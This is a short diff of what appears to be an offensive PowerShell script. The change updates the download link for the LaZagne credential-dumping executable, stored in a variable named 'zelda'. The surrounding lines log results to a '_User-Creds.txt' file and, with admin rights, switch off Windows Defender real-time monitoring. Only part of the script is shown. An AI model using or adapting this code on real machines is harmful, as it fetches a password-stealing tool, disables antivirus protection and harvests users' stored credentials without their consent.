@@ -28,7 +28,7 @@ if (-not $version) {
 }
 $log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 $verm = "v$version"
-$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" 
+$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.6/lazagne.exe" 
 if ($Admin -eq 'True') {
   Set-MpPreference -DisableRealtimeMonitoring $true
 
